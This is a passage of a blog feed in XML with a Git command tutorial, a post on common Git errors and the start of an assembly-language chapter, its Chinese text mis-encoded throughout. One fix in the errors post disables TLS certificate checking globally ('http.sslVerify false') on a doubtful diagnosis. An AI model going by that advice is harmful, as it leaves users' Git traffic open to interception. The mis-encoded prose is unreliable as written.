æ˜¯ç”¨æ¥æ¨é€åˆ°è¿œç¨‹ã€‚</p><h4 id="4ï¼‰ä¿®æ”¹ä»“åº“å¯¹åº”çš„è¿œç¨‹ä»“åº“åœ°å€"><a href="#4ï¼‰ä¿®æ”¹ä»“åº“å¯¹åº”çš„è¿œç¨‹ä»“åº“åœ°å€" class="headerlink" title="4ï¼‰ä¿®æ”¹ä»“åº“å¯¹åº”çš„è¿œç¨‹ä»“åº“åœ°å€"></a>4ï¼‰ä¿®æ”¹ä»“åº“å¯¹åº”çš„è¿œç¨‹ä»“åº“åœ°å€</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git remote set-url origin ä»“åº“åœ°å€<br></code></pre></td></tr></table></figure><h2 id="å››ã€Git-å¸¸ç”¨å‘½ä»¤"><a href="#å››ã€Git-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å››ã€Git å¸¸ç”¨å‘½ä»¤"></a>å››ã€Git å¸¸ç”¨å‘½ä»¤</h2><h3 id="1ã€git-clone"><a href="#1ã€git-clone" class="headerlink" title="1ã€git clone"></a>1ã€git clone</h3><p><code>git clone</code> å®é™…ä¸Šæ˜¯ä¸€ä¸ªå°è£…äº†å…¶ä»–å‡ ä¸ªå‘½ä»¤çš„å‘½ä»¤ã€‚ å®ƒåˆ›å»ºäº†ä¸€ä¸ªæ–°ç›®å½•ï¼Œåˆ‡æ¢åˆ°æ–°çš„ç›®å½•ï¼Œç„¶å <code>git init</code> æ¥åˆå§‹åŒ–ä¸€ä¸ªç©ºçš„ Git ä»“åº“ï¼Œ ç„¶åä¸ºä½ æŒ‡å®šçš„ URL æ·»åŠ ä¸€ä¸ªï¼ˆé»˜è®¤åç§°ä¸º <code>origin</code> çš„ï¼‰è¿œç¨‹ä»“åº“ï¼ˆ<code>git remote add</code>ï¼‰ï¼Œå†é’ˆå¯¹è¿œç¨‹ä»“åº“æ‰§è¡Œ <code>git fetch</code>ï¼Œæœ€åé€šè¿‡ <code>git checkout</code> å°†è¿œç¨‹ä»“åº“çš„æœ€æ–°æäº¤æ£€å‡ºåˆ°æœ¬åœ°çš„å·¥ä½œç›®å½•ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> ä»“åº“åœ°å€(HTTPS or SSH)<br>$ git <span class="hljs-built_in">clone</span> https://gitee.com/***/test.git<br>$ git <span class="hljs-built_in">clone</span> ä»“åº“åœ°å€ æ–‡ä»¶ç›®å½•                   <span class="hljs-comment">#å…‹éš†åˆ°æŒ‡å®šç›®å½•</span><br></code></pre></td></tr></table></figure><h3 id="2ã€git-status"><a href="#2ã€git-status" class="headerlink" title="2ã€git status"></a>2ã€git status</h3><p><code>git status</code> å‘½ä»¤ä¼šæ˜¾ç¤ºå·¥ä½œåŒºåŠæš‚å­˜åŒºåŸŸä¸­ä¸åŒçŠ¶æ€çš„æ–‡ä»¶ã€‚ å…¶ä¸­åŒ…å«äº†å·²ä¿®æ”¹ä½†æœªæš‚å­˜ï¼Œæˆ–å·²ç»æš‚å­˜ä½†æ²¡æœ‰æäº¤çš„æ–‡ä»¶ã€‚ åœ¨ä¸€èˆ¬çš„æ˜¾ç¤ºå½¢å¼ä¸­ï¼Œå®ƒä¼šç»™ä½ ä¸€äº›å¦‚ä½•åœ¨è¿™äº›æš‚å­˜åŒºä¹‹é—´ç§»åŠ¨æ–‡ä»¶çš„æç¤ºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git status<br></code></pre></td></tr></table></figure><h3 id="3ã€git-add"><a href="#3ã€git-add" class="headerlink" title="3ã€git add"></a>3ã€git add</h3><p><code>git add</code> å‘½ä»¤å°†å†…å®¹ä»å·¥ä½œç›®å½•æ·»åŠ åˆ°æš‚å­˜åŒºï¼ˆæˆ–ç§°ä¸ºç´¢å¼•ï¼ˆindexï¼‰åŒºï¼‰ï¼Œä»¥å¤‡ä¸‹æ¬¡æäº¤ã€‚ å½“ <code>git commit</code> å‘½ä»¤æ‰§è¡Œæ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹å®ƒåªä¼šæ£€æŸ¥æš‚å­˜åŒºåŸŸï¼Œå› æ­¤ <code>git add</code> æ˜¯ç”¨æ¥ç¡®å®šä¸‹ä¸€æ¬¡æäº¤æ—¶å¿«ç…§çš„æ ·å­çš„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git add <span class="hljs-string">&quot;readme.txt&quot;</span>   <span class="hljs-comment">#æäº¤readme.txtåˆ°æš‚å­˜åŒº</span><br>$ git add -A             <span class="hljs-comment">#æäº¤å½“å‰ä»“åº“çš„æ‰€æœ‰æ”¹åŠ¨</span><br>$ git add .              <span class="hljs-comment">#æäº¤å½“å‰ä»“åº“çš„æ‰€æœ‰æ”¹åŠ¨</span><br></code></pre></td></tr></table></figure><h3 id="4ã€git-commit"><a href="#4ã€git-commit" class="headerlink" title="4ã€git commit"></a>4ã€git commit</h3><p><code>git commit</code> å‘½ä»¤å°†æ‰€æœ‰é€šè¿‡ <code>git add</code> æš‚å­˜çš„æ–‡ä»¶å†…å®¹åœ¨æ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ªæŒä¹…çš„å¿«ç…§ï¼Œç„¶åå°†å½“å‰åˆ†æ”¯ä¸Šçš„åˆ†æ”¯æŒ‡é’ˆç§»åˆ°å…¶ä¹‹ä¸Šã€‚</p><p>å‚æ•° <code>-m</code> åä¸ºå½“æ¬¡æäº¤çš„å¤‡æ³¨ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git commit -m <span class="hljs-string">&quot;1st commit&quot;</span><br></code></pre></td></tr></table></figure><h3 id="5ã€git-push"><a href="#5ã€git-push" class="headerlink" title="5ã€git push"></a>5ã€git push</h3><p><code>git push</code> å‘½ä»¤ç”¨æ¥ä¸å¦ä¸€ä¸ªä»“åº“é€šä¿¡ï¼Œè®¡ç®—ä½ æœ¬åœ°æ•°æ®åº“ä¸è¿œç¨‹ä»“åº“çš„å·®å¼‚ï¼Œç„¶åå°†å·®å¼‚æ¨é€åˆ°å¦ä¸€ä¸ªä»“åº“ä¸­ã€‚ å®ƒéœ€è¦æœ‰å¦ä¸€ä¸ªä»“åº“çš„å†™æƒé™ï¼Œå› æ­¤è¿™é€šå¸¸æ˜¯éœ€è¦éªŒè¯çš„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git push https://gitee.com/***/test.git<br>$ git push &lt;è¿œç¨‹ä¸»æœºå&gt; &lt;æœ¬åœ°åˆ†æ”¯å&gt;:&lt;è¿œç¨‹åˆ†æ”¯å&gt;   <span class="hljs-comment">#git remoteå</span><br>$ git push &lt;è¿œç¨‹ä¸»æœºå&gt; &lt;æœ¬åœ°åˆ†æ”¯å&gt;              <span class="hljs-comment">#æœ¬åœ°åˆ†æ”¯åä¸è¿œç¨‹åˆ†æ”¯åç›¸åŒ</span><br></code></pre></td></tr></table></figure><p>ä»¥ä¸‹å‘½ä»¤å°†æœ¬åœ°çš„ master åˆ†æ”¯æ¨é€åˆ° origin ä¸»æœºçš„ master åˆ†æ”¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git push origin master:master<br>$ git push origin master           <span class="hljs-comment">#æœ¬åœ°åˆ†æ”¯åä¸è¿œç¨‹åˆ†æ”¯åç›¸åŒ</span><br>$ git push origin                  <span class="hljs-comment">#å½“å‰åˆ†æ”¯ä¸è¿œç¨‹åˆ†æ”¯å­˜åœ¨è¿½è¸ªå…³ç³»</span><br>$ git push                         <span class="hljs-comment">#å½“å‰åˆ†æ”¯åªæœ‰ä¸€ä¸ªè¿½è¸ªåˆ†æ”¯</span><br></code></pre></td></tr></table></figure><p>å¦‚æœå½“å‰åˆ†æ”¯ä¸å¤šä¸ªä¸»æœºå­˜åœ¨è¿½è¸ªå…³ç³»ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™ <strong>-u</strong> é€‰é¡¹ä¼šæŒ‡å®šä¸€ä¸ªé»˜è®¤ä¸»æœºï¼Œè¿™æ ·åé¢å°±å¯ä»¥ä¸åŠ ä»»ä½•å‚æ•°ä½¿ç”¨ <code>git push</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git push -u origin master<br></code></pre></td></tr></table></figure><p>ä¸Šé¢å‘½ä»¤å°†æœ¬åœ°çš„ <strong>master</strong> åˆ†æ”¯æ¨é€åˆ° <strong>origin</strong> ä¸»æœºï¼ŒåŒæ—¶æŒ‡å®š <strong>origin</strong> ä¸º<strong>é»˜è®¤ä¸»æœº</strong>ï¼Œåé¢å°±å¯ä»¥ä¸åŠ ä»»ä½•å‚æ•°ä½¿ç”¨<code>git push</code> äº†ã€‚</p><h3 id="6ã€git-init"><a href="#6ã€git-init" class="headerlink" title="6ã€git init"></a>6ã€git init</h3><p>ä½ åªéœ€è¦ç®€å•åœ°è¿è¡Œ <code>git init</code> å°±å¯ä»¥å°†ä¸€ä¸ªç›®å½•è½¬å˜æˆä¸€ä¸ª Git ä»“åº“ï¼Œè¿™æ ·ä½ å°±å¯ä»¥å¼€å§‹å¯¹å®ƒè¿›è¡Œç‰ˆæœ¬ç®¡ç†äº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git init               <span class="hljs-comment">#åˆå§‹åŒ–ä¸€ä¸ªGitä»“åº“</span><br></code></pre></td></tr></table></figure><h3 id="7ã€git-remote"><a href="#7ã€git-remote" class="headerlink" title="7ã€git remote"></a>7ã€git remote</h3><p><code>git remote</code> å‘½ä»¤æ˜¯ä¸€ä¸ªæ˜¯ä½ è¿œç¨‹ä»“åº“è®°å½•çš„ç®¡ç†å·¥å…·ã€‚ å®ƒå…è®¸ä½ å°†ä¸€ä¸ªé•¿çš„ URL ä¿å­˜æˆä¸€ä¸ªç®€å†™çš„å¥æŸ„ï¼Œä¾‹å¦‚ <code>origin</code> ï¼Œè¿™æ ·ä½ å°±å¯ä»¥ä¸ç”¨æ¯æ¬¡éƒ½è¾“å…¥ä»–ä»¬äº†ã€‚ ä½ å¯ä»¥æœ‰å¤šä¸ªè¿™æ ·çš„å¥æŸ„ï¼Œ<code>git remote</code> å¯ä»¥ç”¨æ¥æ·»åŠ ï¼Œä¿®æ”¹ï¼ŒåŠåˆ é™¤å®ƒä»¬ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git remote add &lt;name&gt; &lt;url&gt;<br></code></pre></td></tr></table></figure><h3 id="8ã€git-pull"><a href="#8ã€git-pull" class="headerlink" title="8ã€git pull"></a>8ã€git pull</h3><p><code>git pull</code> å‘½ä»¤åŸºæœ¬ä¸Šå°±æ˜¯ <code>git fetch</code> å’Œ <code>git merge</code> å‘½ä»¤çš„ç»„åˆä½“ï¼ŒGit ä»ä½ æŒ‡å®šçš„è¿œç¨‹ä»“åº“ä¸­æŠ“å–å†…å®¹ï¼Œç„¶åé©¬ä¸Šå°è¯•å°†å…¶åˆå¹¶è¿›ä½ æ‰€åœ¨çš„åˆ†æ”¯ä¸­ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git pull &lt;è¿œç¨‹ä¸»æœºå&gt; &lt;è¿œç¨‹åˆ†æ”¯å&gt;:&lt;æœ¬åœ°åˆ†æ”¯å&gt;<br></code></pre></td></tr></table></figure><p>å°†è¿œç¨‹ä¸»æœº origin çš„ master åˆ†æ”¯æ‹‰å–è¿‡æ¥ï¼Œä¸æœ¬åœ°çš„ brantest åˆ†æ”¯åˆå¹¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git pull origin master:brantest<br></code></pre></td></tr></table></figure><p>å¦‚æœè¿œç¨‹åˆ†æ”¯æ˜¯ä¸å½“å‰åˆ†æ”¯åˆå¹¶ï¼Œåˆ™å†’å·åé¢çš„éƒ¨åˆ†å¯ä»¥çœç•¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git pull origin master<br></code></pre></td></tr></table></figure><p>å¦‚æœå½“å‰åˆ†æ”¯ä¸è¿œç¨‹åˆ†æ”¯å­˜åœ¨è¿½è¸ªå…³ç³»ï¼Œ<code>git pull</code>å°±å¯ä»¥çœç•¥è¿œç¨‹åˆ†æ”¯åã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git pull origin<br></code></pre></td></tr></table></figure><p>å¦‚æœå½“å‰åˆ†æ”¯åªæœ‰ä¸€ä¸ªè¿½è¸ªåˆ†æ”¯ï¼Œè¿è¿œç¨‹ä¸»æœºåéƒ½å¯ä»¥çœç•¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git pull<br></code></pre></td></tr></table></figure><h2 id="äº”ã€è·å–ä¸æ¨é€é¡¹ç›®"><a href="#äº”ã€è·å–ä¸æ¨é€é¡¹ç›®" class="headerlink" title="äº”ã€è·å–ä¸æ¨é€é¡¹ç›®"></a>äº”ã€è·å–ä¸æ¨é€é¡¹ç›®</h2><p>æœ‰å‡ ç§æ–¹å¼è·å–ä¸€ä¸ª Git ä»“åº“ã€‚ ä¸€ç§æ˜¯ä»ç½‘ç»œä¸Šæˆ–è€…å…¶ä»–åœ°æ–¹æ‹·è´ä¸€ä¸ªç°æœ‰çš„ä»“åº“ï¼Œå¦ä¸€ç§å°±æ˜¯åœ¨ä¸€ä¸ªç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„ä»“åº“ã€‚</p><h3 id="1ã€è¿œç«¯å…‹éš†"><a href="#1ã€è¿œç«¯å…‹éš†" class="headerlink" title="1ã€è¿œç«¯å…‹éš†"></a>1ã€è¿œç«¯å…‹éš†</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> https://gitee.com/***/test.git<br><span class="hljs-comment"># åˆ›å»ºã€ä¿®æ”¹</span><br>$ git status<br>$ git add -A<br>$ git commit -m <span class="hljs-string">&quot;1st commit&quot;</span><br>$ git push origin master<br></code></pre></td></tr></table></figure><h3 id="2ã€æœ¬åœ°åˆ›å»º"><a href="#2ã€æœ¬åœ°åˆ›å»º" class="headerlink" title="2ã€æœ¬åœ°åˆ›å»º"></a>2ã€æœ¬åœ°åˆ›å»º</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ mkdir <span class="hljs-built_in">test</span><br>$ <span class="hljs-built_in">cd</span> <span class="hljs-built_in">test</span><br>$ git init<br><span class="hljs-comment"># åˆ›å»ºã€ä¿®æ”¹</span><br>$ git status<br>$ git add -A<br>$ git commit -m <span class="hljs-string">&quot;1st commit&quot;</span><br>$ git remote add origin https://gitee.com/***/test.git<br>$ git push origin master<br></code></pre></td></tr></table></figure><h2 id="å…­ã€å‚ä¸é¡¹ç›®çš„ä¸€èˆ¬æµç¨‹"><a href="#å…­ã€å‚ä¸é¡¹ç›®çš„ä¸€èˆ¬æµç¨‹" class="headerlink" title="å…­ã€å‚ä¸é¡¹ç›®çš„ä¸€èˆ¬æµç¨‹"></a>å…­ã€å‚ä¸é¡¹ç›®çš„ä¸€èˆ¬æµç¨‹</h2><p>1ã€<strong>Fork</strong> é¡¹ç›®ä»“åº“ï¼Œå»ºç«‹æ´¾ç”Ÿä»“åº“ï¼Œä½œä¸ºè‡ªå·± <strong>Gitee</strong> ä¸Šçš„è¿œç«¯ä»“åº“</p><p>2ã€è·å–è¿œç«¯ä»“åº“ï¼Œä¸€èˆ¬ä¸º <code>clone</code> è¿œç«¯ä»“åº“</p><p>3ã€è¿›è¡Œä¿®æ”¹</p><p>4ã€æ¨é€é¡¹ç›®åˆ°è¿œç«¯ä»“åº“</p><p>5ã€æäº¤ <strong>Pull Requests</strong> </p><p>æ³¨ï¼šå¦‚æœæ˜¯è‡ªå·±åˆ›å»ºçš„å¼€å‘é¡¹ç›®ï¼Œåˆ™ä¸éœ€è¦è¿›è¡Œ <strong>Fork</strong> å’Œ <strong>Pull Requests</strong> </p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>gitee</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gitå¸¸è§å‡ºé”™</title>
    <link href="/2021/07/27/Tools/Git/Git%E5%B8%B8%E8%A7%81%E5%87%BA%E9%94%99/"/>
    <url>/2021/07/27/Tools/Git/Git%E5%B8%B8%E8%A7%81%E5%87%BA%E9%94%99/</url>
    
    <content type="html"><![CDATA[<h2 id="1ã€è¿æ¥è¶…æ—¶"><a href="#1ã€è¿æ¥è¶…æ—¶" class="headerlink" title="1ã€è¿æ¥è¶…æ—¶"></a>1ã€è¿æ¥è¶…æ—¶</h2><p><strong>1ï¼‰é”™è¯¯</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fatal: unable to access Â·Â·Â·Â·Â·Â·: OpenSSL SSL_read: Connection was reset, errno 10054<br></code></pre></td></tr></table></figure><p><strong>2ï¼‰åŸå› åˆ†æ</strong></p><p>è¿æ¥è¶…æ—¶ ã€‚</p><p><strong>3ï¼‰è§£å†³åŠæ³•</strong></p><p>é‡è¯•</p><h2 id="2ã€SSLéªŒè¯"><a href="#2ã€SSLéªŒè¯" class="headerlink" title="2ã€SSLéªŒè¯"></a>2ã€SSLéªŒè¯</h2><p><strong>1ï¼‰é”™è¯¯</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">error: RPC failed; curl 28 OpenSSL SSL_read: Connection was reset, errno 10054<br>fatal: expected flush after ref listing<br></code></pre></td></tr></table></figure><p><strong>2ï¼‰åŸå› åˆ†æ</strong></p><p>æœåŠ¡å™¨çš„ SSL è¯ä¹¦æ²¡æœ‰ç»è¿‡ç¬¬ä¸‰æ–¹æœºæ„çš„ç­¾ç½² ã€‚</p><p><strong>3ï¼‰è§£å†³åŠæ³•</strong></p><p>ä¿®æ”¹è®¾ç½®ï¼Œè§£é™¤ SSL éªŒè¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git config --global http.sslVerify <span class="hljs-string">&quot;false&quot;</span><br></code></pre></td></tr></table></figure><h2 id="3ã€è¿œç«¯åç§°ä¸ç¬¦"><a href="#3ã€è¿œç«¯åç§°ä¸ç¬¦" class="headerlink" title="3ã€è¿œç«¯åç§°ä¸ç¬¦"></a>3ã€è¿œç«¯åç§°ä¸ç¬¦</h2><p><strong>1ï¼‰é”™è¯¯</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">error: src refspec master does not match any<br>error: failed to push some refs to Â·Â·Â·Â·Â·Â·<br></code></pre></td></tr></table></figure><p><strong>2ï¼‰åŸå› åˆ†æ</strong></p><p>GitHub è¿œç«¯ä»“åº“åˆ†æ”¯ç”±åŸæ¥çš„ <code>master</code> æ”¹ä¸ºäº† <code>main</code>ï¼Œ<code>push</code> æ—¶è¿˜ä½¿ç”¨ <code>master</code> å°±ä¼šå¯¼è‡´åç§°ä¸ç¬¦ ã€‚</p><p><strong>3ï¼‰è§£å†³åŠæ³•</strong></p><p>å°† <code>master</code> æ”¹ä¸ºäº† <code>main</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git push -u origin main<br></code></pre></td></tr></table></figure><h2 id="4ã€è¾“å…¥ä¸å¯è§å­—ç¬¦"><a href="#4ã€è¾“å…¥ä¸å¯è§å­—ç¬¦" class="headerlink" title="4ã€è¾“å…¥ä¸å¯è§å­—ç¬¦"></a>4ã€è¾“å…¥ä¸å¯è§å­—ç¬¦</h2><p><strong>1ï¼‰é”™è¯¯</strong></p><p><strong>Git Bashï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> git@gitee.com:keys942/C_samplecode.git<br>Cloning into <span class="hljs-string">&#x27;C_samplecod&#x27;</span>...<br>Permission denied, user: <span class="hljs-string">&#x27;git&#x27;</span><br><br>fatal: Could not <span class="hljs-built_in">read</span> from remote repository.<br><br>Please make sure you have the correct access rights and the repository exists.<br></code></pre></td></tr></table></figure><p><img src="/2021/07/27/Tools/Git/Git%E5%B8%B8%E8%A7%81%E5%87%BA%E9%94%99/8bedb3b37bbaa68e2f3d18356b8e0143.png" alt="image-20211127173707426"></p><p><strong>2ï¼‰åŸå› åˆ†æ</strong></p><p>å‡ºç°ä¸å¯è§å­—ç¬¦ï¼Œå¯¼è‡´ä»“åº“è·¯å¾„é”™è¯¯ ã€‚</p><p><strong>Sublimeï¼š</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ git clone <span class="hljs-symbol">&lt;0x96&gt;</span>git@gitee.<span class="hljs-keyword">com</span>:keys942/C_samplecode.git<br>Cloning into <span class="hljs-string">&#x27;C_samplecod&#x27;</span>...<br>Permission denied, user: <span class="hljs-string">&#x27;&lt;0x96&gt;git&#x27;</span><br><br>fata<span class="hljs-variable">l:</span> Could not <span class="hljs-keyword">read</span> from remote repository.<br><br>Please <span class="hljs-keyword">make</span> sure you have the correct access rights <span class="hljs-built_in">and</span> the repository <span class="hljs-built_in">exists</span>.<br></code></pre></td></tr></table></figure><p><img src="/2021/07/27/Tools/Git/Git%E5%B8%B8%E8%A7%81%E5%87%BA%E9%94%99/c2b10d147bec095f55e44e45ee1a3e42.png" alt="image-20211127173733563"></p><p><strong>3ï¼‰è§£å†³åŠæ³•</strong></p><p>å»æ‰ä¸å¯è§å­—ç¬¦ ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>gitee</tag>
      
      <tag>git</tag>
      
      <tag>github</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Assembly</title>
    <link href="/2021/07/27/Code/Assembly/Assembly/"/>
    <url>/2021/07/27/Code/Assembly/Assembly/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ç« -æ±‡ç¼–è¯­è¨€çš„åŸºç¡€çŸ¥è¯†"><a href="#ç¬¬ä¸€ç« -æ±‡ç¼–è¯­è¨€çš„åŸºç¡€çŸ¥è¯†" class="headerlink" title="ç¬¬ä¸€ç«  æ±‡ç¼–è¯­è¨€çš„åŸºç¡€çŸ¥è¯†"></a>ç¬¬ä¸€ç«  æ±‡ç¼–è¯­è¨€çš„åŸºç¡€çŸ¥è¯†</h1><h2 id="1-1-æ±‡ç¼–è¯­è¨€çš„ä¸€èˆ¬æ¦‚å¿µ"><a href="#1-1-æ±‡ç¼–è¯­è¨€çš„ä¸€èˆ¬æ¦‚å¿µ" class="headerlink" title="1.1 æ±‡ç¼–è¯­è¨€çš„ä¸€èˆ¬æ¦‚å¿µ"></a>1.1 æ±‡ç¼–è¯­è¨€çš„ä¸€èˆ¬æ¦‚å¿µ</h2><h3 id="ä¸€ã€å®šä¹‰"><a href="#ä¸€ã€å®šä¹‰" class="headerlink" title="ä¸€ã€å®šä¹‰"></a>ä¸€ã€å®šä¹‰</h3><p>è™½ç„¶é«˜çº§è¯­è¨€æ–¹ä¾¿äº†äººå¯¹è®¡ç®—æœºçš„ä½¿ç”¨ï¼Œä½†å…¶è¿è¡Œæ•ˆç‡è¾ƒä½ã€‚åœ¨ä¸€äº›åº”ç”¨åœºæ™¯ï¼Œå¦‚ç³»ç»Ÿç®¡ç†ã€å®æ—¶æ§åˆ¶ç­‰ï¼Œéš¾äºæ»¡è¶³è¦æ±‚ã€‚å› æ­¤åˆå¸Œæœ›ä½¿ç”¨æœºå™¨è¯­è¨€ã€‚</p><p>ä¸ºäº†ä¾¿äºè®°å¿†å’Œé˜…è¯»ï¼Œä½¿ç”¨å­—æ¯å’Œç¬¦å·æ¥è¡¨ç¤ºæœºå™¨è¯­è¨€çš„å‘½ä»¤ï¼Œç”¨åè¿›åˆ¶æˆ–åå…­è¿›åˆ¶æ•°æ¥è¡¨ç¤ºæ•°æ®ï¼Œè¿™æ ·çš„è®¡ç®—æœºç¨‹åºè®¾è®¡è¯­è¨€å°±ç§°ä¸ºæ±‡ç¼–è¯­è¨€ã€‚</p><h3 id="äºŒã€æ±‡ç¼–è¯­è¨€ç¨‹åºä¸æœºå™¨è¯­è¨€ç¨‹åºçš„å…³ç³»"><a href="#äºŒã€æ±‡ç¼–è¯­è¨€ç¨‹åºä¸æœºå™¨è¯­è¨€ç¨‹åºçš„å…³ç³»" class="headerlink" title="äºŒã€æ±‡ç¼–è¯­è¨€ç¨‹åºä¸æœºå™¨è¯­è¨€ç¨‹åºçš„å…³ç³»"></a>äºŒã€æ±‡ç¼–è¯­è¨€ç¨‹åºä¸æœºå™¨è¯­è¨€ç¨‹åºçš„å…³ç³»</h3><p>ä¸€æ¡æ±‡ç¼–è¯­è¨€çš„è¯­å¥ä¸ä¸€æ¡æœºå™¨è¯­è¨€æŒ‡ä»¤å¯¹åº”ï¼Œæ±‡ç¼–è¯­è¨€ç¨‹åºä¸æœºå™¨è¯­è¨€ç¨‹åºæ•ˆç‡ç›¸åŒã€‚</p><h3 id="ä¸‰ã€ä¸åŒç±»å‹è®¡ç®—æœºæœ‰ä¸åŒçš„æœºå™¨æŒ‡ä»¤ç³»ç»Ÿå’Œæ±‡ç¼–è¯­è¨€æè¿°"><a href="#ä¸‰ã€ä¸åŒç±»å‹è®¡ç®—æœºæœ‰ä¸åŒçš„æœºå™¨æŒ‡ä»¤ç³»ç»Ÿå’Œæ±‡ç¼–è¯­è¨€æè¿°" class="headerlink" title="ä¸‰ã€ä¸åŒç±»å‹è®¡ç®—æœºæœ‰ä¸åŒçš„æœºå™¨æŒ‡ä»¤ç³»ç»Ÿå’Œæ±‡ç¼–è¯­è¨€æè¿°"></a>ä¸‰ã€ä¸åŒç±»å‹è®¡ç®—æœºæœ‰ä¸åŒçš„æœºå™¨æŒ‡ä»¤ç³»ç»Ÿå’Œæ±‡ç¼–è¯­è¨€æè¿°</h3><p>ä¸ºäº†å­¦ä¹ å’Œä½¿ç”¨æŸç§è®¡ç®—æœºçš„æ±‡ç¼–è¯­è¨€ï¼Œå¿…é¡»ç†Ÿæ‚‰è®¡ç®—æœºçš„å†…éƒ¨ç»„æˆç»“æ„ã€‚ä½†å¹¶éè¦æŒæ¡è®¡ç®—æœºç³»ç»Ÿçš„å…¨éƒ¨ç¡¬ä»¶ç»„æˆï¼Œåªéœ€æŒæ¡ç”¨æ±‡ç¼–è¯­è¨€ç¼–åˆ¶ç¨‹åºæ—¶æ‰€æ¶‰åŠåˆ°çš„é‚£äº›ç¡¬ä»¶çš„ç»“æ„å’ŒåŠŸèƒ½ã€‚</p><p>å¯¹ä¸€å°è®¡ç®—æœºæ¥è¯´ï¼Œæœºå™¨è¯­è¨€çš„æ‰§è¡Œä¸»è¦å–å†³äºè¯¥è®¡ç®—æœºçš„ä¸­å¤®å¤„ç†å™¨CPUã€‚å› æ­¤ç†Ÿæ‚‰è®¡ç®—æœºå†…éƒ¨ç»“æ„ä¸»è¦æ˜¯æŒ‡CPUçš„åŠŸèƒ½ç»“æ„ã€‚å®ƒåŒ…æ‹¬ï¼š</p><ul><li>CPU ä¸­æœ‰å¤šå°‘ä¸ªå¯„å­˜å™¨åŠå…¶ä½œç”¨ï¼Ÿ</li><li>CPU 